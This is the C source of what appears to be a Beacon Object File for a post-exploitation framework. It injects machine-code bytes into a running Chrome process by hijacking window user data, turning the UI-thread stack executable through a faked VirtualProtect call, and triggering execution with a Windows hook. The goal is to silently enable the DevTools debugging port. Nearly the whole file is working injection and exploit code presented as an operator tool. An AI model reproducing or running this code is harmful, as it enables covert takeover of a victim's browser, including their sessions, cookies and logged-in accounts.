#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include "beacon.h"

/*
 * Automatic, fileless CDP-enablement BOF for process-isolated Chrome.
 *
 * The controller needs only query-limited process access.  It discovers the
 * installed chrome.dll, resolves the required Chrome symbols from signatures,
 * places a fake WindowImpl object and native body on Chrome's UI-thread stack,
 * and enters that body through the existing-image User32 hook handoff.
 */

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenThread(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$QueryFullProcessImageNameW(HANDLE, DWORD, LPWSTR, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$GetNativeSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$VirtualQueryEx(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION,
                                                      SIZE_T);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExW(LPCWSTR, HANDLE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT LONG NTAPI NTDLL$NtQueryInformationThread(HANDLE, THREADINFOCLASS, PVOID, ULONG,
                                                          PULONG);
DECLSPEC_IMPORT BOOL WINAPI USER32$EnumWindows(WNDENUMPROC, LPARAM);
DECLSPEC_IMPORT int WINAPI USER32$GetClassNameW(HWND, LPWSTR, int);
DECLSPEC_IMPORT DWORD WINAPI USER32$GetWindowThreadProcessId(HWND, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI USER32$IsWindowVisible(HWND);
DECLSPEC_IMPORT LONG_PTR WINAPI USER32$GetWindowLongPtrW(HWND, int);
DECLSPEC_IMPORT LONG_PTR WINAPI USER32$SetWindowLongPtrW(HWND, int, LONG_PTR);
DECLSPEC_IMPORT LRESULT WINAPI USER32$SendMessageW(HWND, UINT, WPARAM, LPARAM);
DECLSPEC_IMPORT BOOL WINAPI USER32$IsWindow(HWND);
DECLSPEC_IMPORT HHOOK WINAPI USER32$SetWindowsHookExW(int, HOOKPROC, HINSTANCE, DWORD);
DECLSPEC_IMPORT BOOL WINAPI USER32$UnhookWindowsHookEx(HHOOK);

typedef struct {
  LONG exit_status;
  PVOID teb;
  CLIENT_ID id;
  ULONG_PTR affinity;
  LONG priority, base_priority;
} THREAD_BASIC_INFO;
typedef struct {
  DWORD pid, tid;
  HWND hwnd;
  DWORD rejected_pids[16];
  DWORD rejected_count;
} CHROME_TARGET;

static const BYTE trampoline[16] = {0x49, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x10, 0x48,
                                    0x05, 0x00, 0x06, 0x00, 0x00, 0xff, 0xe0, 0x90};
static const BYTE cdp_body[176] = {
    0x53, 0x56, 0x48, 0x83, 0xec, 0x68, 0x4c, 0x89, 0xc6, 0x48, 0x8b, 0x1e, 0x48, 0x8b, 0x5b, 0x10,
    0x48, 0x8b, 0x8b, 0x30, 0x05, 0x00, 0x00, 0x48, 0x8b, 0x83, 0x38, 0x05, 0x00, 0x00, 0xff, 0xd0,
    0x48, 0x8b, 0x4e, 0x18, 0xba, 0xeb, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0x83, 0x20, 0x05, 0x00, 0x00,
    0x48, 0x8b, 0x83, 0x28, 0x05, 0x00, 0x00, 0xff, 0xd0, 0xb9, 0x10, 0x00, 0x00, 0x00, 0x48, 0x8b,
    0x83, 0x00, 0x05, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x31, 0xc9, 0x48, 0x89,
    0x48, 0x08, 0x48, 0x8b, 0x8b, 0x08, 0x05, 0x00, 0x00, 0x48, 0x89, 0x08, 0x66, 0x8b, 0x8b, 0x18,
    0x05, 0x00, 0x00, 0x66, 0x89, 0x48, 0x08, 0x31, 0xc9, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x89,
    0x4c, 0x24, 0x30, 0x48, 0x89, 0x4c, 0x24, 0x38, 0x48, 0x89, 0x4c, 0x24, 0x40, 0x48, 0x89, 0x4c,
    0x24, 0x48, 0x48, 0x89, 0x4c, 0x24, 0x50, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x48, 0x8d, 0x54, 0x24,
    0x28, 0x4c, 0x8d, 0x44, 0x24, 0x40, 0x45, 0x31, 0xc9, 0x48, 0x8b, 0x83, 0x10, 0x05, 0x00, 0x00,
    0xff, 0xd0, 0x31, 0xc0, 0x48, 0x83, 0xc4, 0x68, 0x5e, 0x5b, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90};

/* Stable instruction signatures carried over from cdp-enable-bof.  Relative
 * displacements are masked, so these resolve per-install RVAs rather than
 * assuming a Chrome build number. */
static const BYTE start_sig[] = {
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xec, 0x48, 0x44, 0x89, 0xcd, 0x4d,
    0x89, 0xc6, 0x48, 0x89, 0xd3, 0x48, 0x89, 0xce, 0x48, 0x8b, 0x05, 0,    0,    0,    0,    0x48,
    0x31, 0xe0, 0x48, 0x89, 0x44, 0x24, 0x40, 0xe8, 0,    0,    0,    0,    0x4c, 0x8b, 0x78, 0x08,
    0x4d, 0x85, 0xff, 0x0f, 0x84, 0,    0,    0,    0,    0xb9, 0x90, 0,    0,    0};
static const BYTE start_mask[] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
                                  1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0,
                                  0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1};
static const BYTE new_sig[] = {0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xeb};
static const BYTE entry0_sig[] = {0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x89, 0xce, 0xf6, 0xc2,
                                  0x01, 0x74, 0x08, 0x48, 0x89, 0xf1, 0xe8, 0,    0,    0,
                                  0,    0x48, 0x89, 0xf0, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0xc3};
static const BYTE entry0_mask[] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
                                   1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1};
static const BYTE entry1_sig[] = {
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xec, 0x88, 0,    0,
    0,    0x48, 0x89, 0xd6, 0x48, 0x8b, 0x05, 0,    0,    0,    0,    0x48, 0x31, 0xe0,
    0x48, 0x89, 0x84, 0x24, 0x80, 0,    0,    0,    0x0f, 0xb7, 0x59, 0x08, 0xb9, 0x38,
    0,    0,    0,    0xe8, 0,    0,    0,    0,    0x48, 0x89, 0xc7, 0x48, 0x8b, 0x05,
    0,    0,    0,    0,    0x48, 0x8d, 0x0d, 0,    0,    0,    0};
static const BYTE entry1_mask[] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1,
                                   1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1,
                                   0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1,
                                   1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0};

static void copy_bytes(BYTE* d, const BYTE* s, SIZE_T n) {
  while (n--) *d++ = *s++;
}
static void putq(BYTE* d, DWORD o, uintptr_t v) { copy_bytes(d + o, (BYTE*)&v, 8); }
static int eqw(const wchar_t* a, const wchar_t* b) {
  while (*a && *a == *b) {
    a++;
    b++;
  }
  return *a == *b;
}

static int eqa(const char* a, const char* b) {
  while (*a && *a == *b) {
    a++;
    b++;
  }
  return *a == *b;
}

static BOOL CALLBACK find_window(HWND h, LPARAM value) {
  CHROME_TARGET* f = (CHROME_TARGET*)value;
  DWORD pid = 0;
  wchar_t c[64] = {0};
  DWORD tid = USER32$GetWindowThreadProcessId(h, &pid);
  for (DWORD i = 0; i < f->rejected_count; i++)
    if (f->rejected_pids[i] == pid) return TRUE;
  if (USER32$IsWindowVisible(h) && USER32$GetClassNameW(h, c, 64) &&
      eqw(c, L"Chrome_WidgetWin_1")) {
    f->pid = pid;
    f->hwnd = h;
    f->tid = tid;
    return FALSE;
  }
  return TRUE;
}

static int locate_chrome_window(CHROME_TARGET* target) {
  target->pid = 0;
  target->tid = 0;
  target->hwnd = 0;
  USER32$EnumWindows(find_window, (LPARAM)target);
  return target->hwnd != 0;
}

static uintptr_t stack_top(HANDLE p, uintptr_t teb) {
  SYSTEM_INFO s;
  KERNEL32$GetNativeSystemInfo(&s);
  uintptr_t at = (uintptr_t)s.lpMinimumApplicationAddress, best = 0, best_distance = (uintptr_t)-1;
  while (at < (uintptr_t)s.lpMaximumApplicationAddress) {
    MEMORY_BASIC_INFORMATION m = {0};
    if (!KERNEL32$VirtualQueryEx(p, (PVOID)at, &m, sizeof(m)) || !m.RegionSize) break;
    uintptr_t ab = (uintptr_t)m.AllocationBase, n = (uintptr_t)m.BaseAddress + m.RegionSize;
    if (ab && n == ab + 0x800000 && m.AllocationProtect == PAGE_READWRITE &&
        m.State == MEM_COMMIT && m.Type == MEM_PRIVATE) {
      uintptr_t adjusted = ab;
      while (adjusted < teb && teb - adjusted < 0x100000000ULL) adjusted += 0x80000000;
      uintptr_t distance = adjusted >= teb ? adjusted - teb : (uintptr_t)-1;
      if (distance < best_distance) {
        best_distance = distance;
        best = n;
      }
    }
    if (n <= at) break;
    at = n;
  }
  return best_distance < 0x800000 ? best : 0;
}

static uintptr_t import_slot(HMODULE m, const char* name) {
  IMAGE_DOS_HEADER* d = (IMAGE_DOS_HEADER*)m;
  IMAGE_NT_HEADERS64* n = (IMAGE_NT_HEADERS64*)((BYTE*)m + d->e_lfanew);
  DWORD r = n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
  if (!r) return 0;
  IMAGE_IMPORT_DESCRIPTOR* x = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)m + r);
  for (; x->Name; x++) {
    IMAGE_THUNK_DATA64* o =
        (IMAGE_THUNK_DATA64*)((BYTE*)m +
                              (x->OriginalFirstThunk ? x->OriginalFirstThunk : x->FirstThunk));
    IMAGE_THUNK_DATA64* t = (IMAGE_THUNK_DATA64*)((BYTE*)m + x->FirstThunk);
    for (; o->u1.AddressOfData; o++, t++) {
      if (IMAGE_SNAP_BY_ORDINAL64(o->u1.Ordinal)) continue;
      IMAGE_IMPORT_BY_NAME* bn = (IMAGE_IMPORT_BY_NAME*)((BYTE*)m + o->u1.AddressOfData);
      if (eqa((char*)bn->Name, name)) return (uintptr_t)t;
    }
  }
  return 0;
}

static int pe_sections(HMODULE m, BYTE** text, SIZE_T* text_size, BYTE** rdata, SIZE_T* rdata_size,
                       SIZE_T* image_size) {
  IMAGE_DOS_HEADER* d = (IMAGE_DOS_HEADER*)m;
  if (d->e_magic != IMAGE_DOS_SIGNATURE) return 0;
  IMAGE_NT_HEADERS64* n = (IMAGE_NT_HEADERS64*)((BYTE*)m + d->e_lfanew);
  if (n->Signature != IMAGE_NT_SIGNATURE) return 0;
  IMAGE_SECTION_HEADER* s =
      (IMAGE_SECTION_HEADER*)((BYTE*)&n->OptionalHeader + n->FileHeader.SizeOfOptionalHeader);
  *text = 0;
  *rdata = 0;
  *image_size = n->OptionalHeader.SizeOfImage;
  for (WORD i = 0; i < n->FileHeader.NumberOfSections; i++) {
    if (s[i].Name[0] == '.' && s[i].Name[1] == 't' && s[i].Name[2] == 'e' && s[i].Name[3] == 'x' &&
        s[i].Name[4] == 't') {
      *text = (BYTE*)m + s[i].VirtualAddress;
      *text_size = s[i].Misc.VirtualSize;
    } else if (s[i].Name[0] == '.' && s[i].Name[1] == 'r' && s[i].Name[2] == 'd' &&
               s[i].Name[3] == 'a' && s[i].Name[4] == 't' && s[i].Name[5] == 'a') {
      *rdata = (BYTE*)m + s[i].VirtualAddress;
      *rdata_size = s[i].Misc.VirtualSize;
    }
  }
  return *text && *rdata;
}

static int match(const BYTE* p, const BYTE* sig, const BYTE* mask, SIZE_T n) {
  for (SIZE_T i = 0; i < n; i++)
    if ((!mask || mask[i]) && p[i] != sig[i]) return 0;
  return 1;
}
static int scan(BYTE* base, SIZE_T size, const BYTE* sig, const BYTE* mask, SIZE_T n,
                uintptr_t* out, int max) {
  int hits = 0;
  if (size < n) return 0;
  for (SIZE_T i = 0; i <= size - n; i++)
    if (match(base + i, sig, mask, n)) {
      if (hits < max) out[hits] = (uintptr_t)(base + i);
      hits++;
      if (hits > max) return hits;
    }
  return hits;
}
static uintptr_t find_vtable(BYTE* rdata, SIZE_T rdata_size, uintptr_t* destr, int nd,
                             uintptr_t entry1, BYTE* text, SIZE_T text_size) {
  uintptr_t candidate = 0;
  int hits = 0;
  for (SIZE_T i = 0; i + 16 <= rdata_size; i += 8) {
    uintptr_t a = *(uintptr_t*)(rdata + i), b = *(uintptr_t*)(rdata + i + 8);
    int valid_entry0 = 0;
    if (b != entry1) continue;
    for (int j = 0; j < nd; j++)
      if (a == destr[j]) {
        valid_entry0 = 1;
        break;
      }
    if (!nd && a >= (uintptr_t)text && a < (uintptr_t)text + text_size)
      valid_entry0 = 1;
    if (valid_entry0) {
      candidate = (uintptr_t)(rdata + i);
      hits++;
      if (hits > 1) return 0;
    }
  }
  return hits == 1 ? candidate : 0;
}

static int resolve_local(HMODULE chrome, uintptr_t* start, uintptr_t* chrome_new, uintptr_t* vtable,
                         SIZE_T* image_size) {
  BYTE *text = 0, *rdata = 0;
  SIZE_T ts = 0, rs = 0;
  uintptr_t one[2] = {0}, destr[32] = {0}, entry1[2] = {0};
  if (!pe_sections(chrome, &text, &ts, &rdata, &rs, image_size)) return 1;
  if (scan(text, ts, start_sig, start_mask, sizeof(start_sig), one, 1) != 1) return 2;
  *start = one[0];
  if (scan(text, ts, new_sig, 0, sizeof(new_sig), one, 1) != 1) return 3;
  *chrome_new = one[0];
  int ne = scan(text, ts, entry1_sig, entry1_mask, sizeof(entry1_sig), entry1, 1);
  if (ne != 1) return 4;
  int nd = scan(text, ts, entry0_sig, entry0_mask, sizeof(entry0_sig), destr, 32);
  if (nd > 32) return 5;
  *vtable = find_vtable(rdata, rs, destr, nd, entry1[0], text, ts);
  return *vtable ? 0 : 6;
}

static uintptr_t remote_image(HANDLE p, SIZE_T image_size) {
  SYSTEM_INFO s;
  KERNEL32$GetNativeSystemInfo(&s);
  uintptr_t at = (uintptr_t)s.lpMinimumApplicationAddress, hit = 0, last = 0;
  int hits = 0;
  while (at < (uintptr_t)s.lpMaximumApplicationAddress) {
    MEMORY_BASIC_INFORMATION m = {0};
    if (!KERNEL32$VirtualQueryEx(p, (PVOID)at, &m, sizeof(m)) || !m.RegionSize) break;
    uintptr_t n = (uintptr_t)m.BaseAddress + m.RegionSize;
    if (m.Type == MEM_IMAGE && (uintptr_t)m.BaseAddress == (uintptr_t)m.AllocationBase &&
        (uintptr_t)m.AllocationBase != last) {
      uintptr_t end = n, q = n;
      MEMORY_BASIC_INFORMATION z = {0};
      while (KERNEL32$VirtualQueryEx(p, (PVOID)q, &z, sizeof(z)) && z.RegionSize &&
             (uintptr_t)z.AllocationBase == (uintptr_t)m.AllocationBase) {
        end = (uintptr_t)z.BaseAddress + z.RegionSize;
        if (end <= q) break;
        q = end;
      }
      if (end - (uintptr_t)m.AllocationBase == image_size) {
        hit = (uintptr_t)m.AllocationBase;
        hits++;
        if (hits > 1) return 0;
      }
      last = (uintptr_t)m.AllocationBase;
    }
    if (n <= at) break;
    at = n;
  }
  return hits == 1 ? hit : 0;
}

static SIZE_T wlen(const wchar_t* s) {
  SIZE_T n = 0;
  while (s[n]) n++;
  return n;
}
static int wappend(wchar_t* d, SIZE_T cap, const wchar_t* s) {
  SIZE_T n = wlen(d), i = 0;
  while (s[i]) {
    if (n + i + 1 >= cap) return 0;
    d[n + i] = s[i];
    i++;
  }
  d[n + i] = 0;
  return 1;
}
static HMODULE find_installed_chrome(HANDLE p, uintptr_t* target_base) {
  wchar_t root[520], glob[520];
  root[0] = 0;
  glob[0] = 0;
  DWORD n = 519;
  if (!KERNEL32$QueryFullProcessImageNameW(p, 0, root, &n)) return 0;
  while (n && root[n - 1] != L'\\') n--;
  if (!n) return 0;
  root[n] = 0;
  copy_bytes((BYTE*)glob, (BYTE*)root, (n + 1) * sizeof(wchar_t));
  if (!wappend(glob, 520, L"*")) return 0;
  WIN32_FIND_DATAW fd;
  HANDLE h = KERNEL32$FindFirstFileW(glob, &fd);
  if (h == INVALID_HANDLE_VALUE) return 0;
  HMODULE result = 0;
  uintptr_t result_target = 0;
  do {
    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.cFileName[0] < L'0' ||
        fd.cFileName[0] > L'9')
      continue;
    wchar_t candidate[520];
    candidate[0] = 0;
    copy_bytes((BYTE*)candidate, (BYTE*)root, (n + 1) * sizeof(wchar_t));
    if (!wappend(candidate, 520, fd.cFileName) || !wappend(candidate, 520, L"\\chrome.dll"))
      continue;
    HMODULE m = KERNEL32$LoadLibraryExW(candidate, 0, DONT_RESOLVE_DLL_REFERENCES);
    if (!m) continue;
    BYTE *t = 0, *r = 0;
    SIZE_T ts = 0, rs = 0, image_size = 0;
    if (pe_sections(m, &t, &ts, &r, &rs, &image_size)) {
      uintptr_t target = remote_image(p, image_size);
      if (target) {
        if (result) {
          KERNEL32$FreeLibrary(m);
          KERNEL32$FreeLibrary(result);
          result = 0;
          result_target = 0;
          break;
        }
        result = m;
        result_target = target;
        continue;
      }
    }
    KERNEL32$FreeLibrary(m);
  } while (KERNEL32$FindNextFileW(h, &fd));
  KERNEL32$FindClose(h);
  *target_base = result_target;
  return result;
}

static int protect_handoff(CHROME_TARGET* f, uintptr_t fixed, uintptr_t slot) {
  DWORD n = 0x800;
  BYTE* d = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, n);
  if (!d) return 0;
  for (DWORD o = 0; o + 0x20 <= n; o += 0x20) {
    putq(d, o, slot - 0x20);
    putq(d, o + 0x10, slot - 0x20);
  }
  USER32$SetWindowLongPtrW(f->hwnd, GWLP_USERDATA, (LONG_PTR)fixed);
  COPYDATASTRUCT c = {0x50524f54454354, n, d};
  LRESULT r = USER32$SendMessageW(f->hwnd, WM_COPYDATA, PAGE_EXECUTE_READWRITE, (LPARAM)&c);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, d);
  return r != 0 && USER32$IsWindow(f->hwnd);
}

/* Leave a harmless, target-image-backed fake object at the future fixed
 * address before GWLP_USERDATA points there.  This closes the only interval
 * in which an unrelated UI message could otherwise dereference uninitialized
 * stack bytes. */
static int seed_carpet(CHROME_TARGET* f, uintptr_t slot) {
  DWORD n = 0x800;
  BYTE* d = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, n);
  if (!d) return 0;
  for (DWORD o = 0; o + 0x20 <= n; o += 0x20) {
    putq(d, o, slot - 0x20);
    putq(d, o + 0x10, slot - 0x20);
  }
  COPYDATASTRUCT c = {0x53454544434152, n, d};
  USER32$SendMessageW(f->hwnd, WM_COPYDATA, 0, (LPARAM)&c);
  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, d);
  return USER32$IsWindow(f->hwnd);
}

void go(char* args, int len) {
  datap parser;
  CHROME_TARGET f = {0};
  THREAD_BASIC_INFO basic = {0};
  HANDLE th = 0, pr = 0;
  HMODULE chrome = 0, user32 = 0;
  uintptr_t target_chrome = 0;
  BYTE* d = 0;

  BeaconDataParse(&parser, args, len);
  if (BeaconDataLength(&parser) < 4) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Port required");
    return;
  }
  int port = BeaconDataInt(&parser);
  if (port < 9000 || port > 65535) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Port out of range");
    return;
  }

  /*
   * Chrome and Edge share the same top-level window class. Automatic mode
   * therefore rejects each candidate whose installation does not contain a
   * versioned chrome.dll matching one of that process's mapped images.
   */
  while (f.rejected_count < 16) {
    if (!locate_chrome_window(&f)) {
      BeaconPrintf(CALLBACK_ERROR, "[-] No visible Chrome window found");
      goto cleanup;
    }
    pr = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, f.pid);
    if (pr) chrome = find_installed_chrome(pr, &target_chrome);
    if (pr && chrome) break;
    if (pr) KERNEL32$CloseHandle(pr);
    pr = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Skipping non-Chrome Chromium PID %lu", f.pid);
    f.rejected_pids[f.rejected_count++] = f.pid;
  }
  if (!pr) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Automatic Chrome target selection failed");
    goto cleanup;
  }

  th = KERNEL32$OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, f.tid);
  if (!th) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Query-limited UI-thread open failed: %lu",
                 KERNEL32$GetLastError());
    goto cleanup;
  }

  /* Query the UI-thread TEB and infer the top of its native stack mapping. */
  if (NTDLL$NtQueryInformationThread(th, ThreadBasicInformation, &basic, sizeof(basic), 0)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] UI-thread TEB query failed");
    goto cleanup;
  }
  uintptr_t st = stack_top(pr, (uintptr_t)basic.teb);
  if (!st) {
    BeaconPrintf(CALLBACK_ERROR, "[-] UI-thread stack layout not found (TEB %p)", basic.teb);
    goto cleanup;
  }
  uintptr_t fixed = st - 0x1c00;

  /*
   * Automatic mode enumerates Chrome version directories and selects the
   * chrome.dll whose PE SizeOfImage uniquely matches the target mapping.
   */
  user32 = KERNEL32$GetModuleHandleW(L"user32.dll");
  if (!chrome) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Automatic Chrome image discovery failed");
    goto cleanup;
  }

  /* Map the matching image locally and resolve version-independent symbols. */
  uintptr_t start = 0, chrome_new = 0, vtable = 0;
  SIZE_T chrome_size = 0;
  int symbol_error = resolve_local(chrome, &start, &chrome_new, &vtable, &chrome_size);
  if (symbol_error) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Chrome signature stage failed: %d", symbol_error);
    goto cleanup;
  }
  if (!target_chrome) target_chrome = remote_image(pr, chrome_size);
  if (!target_chrome) {
    BeaconPrintf(CALLBACK_ERROR,
                 "[-] Target chrome.dll mapping not uniquely identified (size %llu)",
                 (unsigned long long)chrome_size);
    goto cleanup;
  }
  uintptr_t delta = target_chrome - (uintptr_t)chrome,
            local_pid_slot = import_slot(chrome, "GetCurrentProcessId"),
            local_vp_slot = import_slot(chrome, "VirtualProtect");
  if (!local_pid_slot || !local_vp_slot) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Installed Chrome IAT slots not found");
    goto cleanup;
  }
  uintptr_t pid_slot = local_pid_slot + delta, vp_slot = local_vp_slot + delta;
  start += delta;
  chrome_new += delta;
  vtable += delta;
  LONG_PTR original = USER32$GetWindowLongPtrW(f.hwnd, GWLP_USERDATA);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] PID %lu TID %lu stack %p chrome %p size %llu", f.pid, f.tid,
               (PVOID)st, (PVOID)target_chrome, (unsigned long long)chrome_size);
  BeaconPrintf(CALLBACK_OUTPUT, "[*] CDP RVAs start=%p new=%p vtable=%p",
               (PVOID)(start - target_chrome), (PVOID)(chrome_new - target_chrome),
               (PVOID)(vtable - target_chrome));

  /*
   * Seed a safe fake-object carpet, substitute GWLP_USERDATA, and use the
   * normal WindowImpl virtual dispatch to call VirtualProtect in Chrome.
   */
  USER32$SendMessageW(f.hwnd, WM_SETREDRAW, FALSE, 0);
  if (!seed_carpet(&f, pid_slot)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Safe pre-seed failed");
    goto restore;
  }
  if (!protect_handoff(&f, fixed, vp_slot)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Protection handoff failed");
    goto restore;
  }
  MEMORY_BASIC_INFORMATION page = {0};
  if (!KERNEL32$VirtualQueryEx(pr, (PVOID)fixed, &page, sizeof(page)) || page.State != MEM_COMMIT ||
      !(page.Protect & PAGE_EXECUTE_READWRITE)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Target page did not become executable");
    goto restore;
  }
  DWORD n = 0x800;
  d = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, n);
  if (!d) goto restore;

  /* Build the self-restoring CDP payload and repeat its entry trampoline. */
  for (DWORD o = 0; o + sizeof(trampoline) <= n; o += sizeof(trampoline))
    copy_bytes(d + o, trampoline, sizeof(trampoline));
  copy_bytes(d + 0x600, cdp_body, sizeof(cdp_body));
  putq(d, 0x500, chrome_new);
  putq(d, 0x508, vtable);
  putq(d, 0x510, start);
  *(USHORT*)(d + 0x518) = (USHORT)port;
  putq(d, 0x520, (uintptr_t)original);
  putq(d, 0x528, (uintptr_t)KERNEL32$GetProcAddress(user32, "SetWindowLongPtrW"));
  putq(d, 0x538, (uintptr_t)KERNEL32$GetProcAddress(user32, "UnhookWindowsHookEx"));
  uintptr_t synthetic_proc = (uintptr_t)chrome + fixed - target_chrome;
  HHOOK hook = USER32$SetWindowsHookExW(WH_CALLWNDPROC, (HOOKPROC)synthetic_proc, chrome, f.tid);
  putq(d, 0x530, (uintptr_t)hook);
  if (!hook) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Existing-image hook failed: %lu", KERNEL32$GetLastError());
    goto restore;
  }

  /* Synchronously trigger execution while the target-side copy is alive. */
  COPYDATASTRUCT c = {0x434450, n, d};
  USER32$SendMessageW(f.hwnd, WM_COPYDATA, 0, (LPARAM)&c);
  USER32$UnhookWindowsHookEx(hook);
restore:
  /* The native payload also restores these values before it starts CDP. */
  if (USER32$IsWindow(f.hwnd)) {
    USER32$SetWindowLongPtrW(f.hwnd, GWLP_USERDATA, original);
    USER32$SendMessageW(f.hwnd, WM_SETREDRAW, TRUE, 0);
  }
  BeaconPrintf(USER32$IsWindow(f.hwnd) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
               USER32$IsWindow(f.hwnd) ? "[+] CDP body dispatched on port %d"
                                       : "[-] Chrome exited during callback",
               port);
cleanup:
  if (d) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, d);
  if (chrome) KERNEL32$FreeLibrary(chrome);
  if (pr) KERNEL32$CloseHandle(pr);
  if (th) KERNEL32$CloseHandle(th);
}
